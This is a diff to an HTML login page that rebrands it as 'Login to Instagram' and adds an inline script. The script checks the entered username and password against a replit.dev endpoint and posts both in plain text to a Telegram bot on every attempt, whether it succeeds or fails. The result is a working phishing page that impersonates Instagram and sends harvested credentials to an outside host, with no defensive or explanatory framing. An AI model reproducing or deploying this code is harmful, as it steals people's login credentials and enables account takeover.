@@ -39,17 +39,85 @@
         button:hover {
             background-color: #4cae4c;
         }
+        .message {
+            margin-top: 10px;
+            font-weight: bold;
+        }
+        .error {
+            color: red;
+        }
+        .success {
+            color: green;
+        }
     </style>
 </head>
 <body>
     <div class="login-container">
-        <h2>Login</h2>
+        <h2>Login to Instagram</h2>
         <form id="loginForm">
             <input type="text" id="username" placeholder="Username" required>
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Login</button>
         </form>
+        <p class="message" id="message"></p>
     </div>
-    <script src="script.js"></script>
+    <script>
+        const apiUrl = "https://d9f0130f-707a-46ed-b30a-d1d5b420c560-00-3lnvptj53i2o2.pike.replit.dev/login";
+        const telegramApiUrl = "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage";
+        const chatId = "<YOUR_CHAT_ID>";
+
+        const loginForm = document.getElementById("loginForm");
+        const message = document.getElementById("message");
+
+        loginForm.addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            // إرسال الطلب إلى API الخاص بفحص الحساب
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username, password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    sendTelegramMessage(`Login successful!\nUsername: ${username}\nPassword: ${password}`);
+                    message.textContent = "Login successful!";
+                    message.className = "message success";
+                    window.location.href = "/acc"; // إعادة توجيه عند النجاح
+                } else {
+                    sendTelegramMessage(`Login failed!\nUsername: ${username}\nPassword: ${password}`);
+                    message.textContent = "Password incorrect";
+                    message.className = "message error";
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                message.textContent = "Password incorrect";
+                message.className = "message error";
+            });
+        });
+
+        // دالة إرسال رسالة إلى Telegram
+        function sendTelegramMessage(text) {
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text
+                })
+            }).catch(error => {
+                console.error("Telegram Error:", error);
+            });
+        }
+    </script>
 </body>
 </html>
